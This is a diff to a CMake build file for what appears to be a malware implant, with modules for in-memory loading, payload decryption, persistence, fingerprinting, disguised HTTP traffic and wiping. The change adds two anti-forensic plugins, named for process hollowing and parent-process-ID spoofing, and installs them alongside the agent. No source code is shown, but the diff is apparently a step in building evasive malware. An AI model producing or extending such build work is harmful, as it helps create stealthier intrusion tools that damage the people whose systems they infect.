@@ -27,9 +27,14 @@ target_link_libraries(CmdWipe CommandCore)
 target_link_libraries(CmdDeepSleep CommandCore)
 target_link_libraries(CmdSafeMode CommandCore)
 
+add_library(ProcessHollowingStub SHARED src/AntiForensic/ProcessHollowingStub.cpp)
+target_link_libraries(ProcessHollowingStub CommandCore)
+add_library(PPIDSpoofingStub SHARED src/AntiForensic/PPIDSpoofingStub.cpp)
+target_link_libraries(PPIDSpoofingStub CommandCore)
+
 add_executable(agent src/main.cpp src/Loader.cpp src/MemoryLoader.cpp src/PayloadDecryptor.cpp src/Globals.cpp src/HttpHeaderRandomizer.cpp src/ConfigModule.cpp src/RequestSigner.cpp src/Fingerprint.cpp src/Crypto.cpp src/KeyExchange.cpp src/Wipe.cpp)
 target_link_libraries(agent dl OpenSSL::Crypto CURL::libcurl CommandCore uuid)
 target_compile_definitions(agent PRIVATE STATIC_AGENT)
 
 install(TARGETS agent DESTINATION bin)
-install(TARGETS FingerprintModule CommandHandler UpdateHandler KeyExchange PersistenceModule ConfigModule CmdSafeMode CmdDeepSleep CmdWipe IPC DESTINATION plugins)
+install(TARGETS FingerprintModule CommandHandler UpdateHandler KeyExchange PersistenceModule ConfigModule CmdSafeMode CmdDeepSleep CmdWipe IPC ProcessHollowingStub PPIDSpoofingStub DESTINATION plugins)
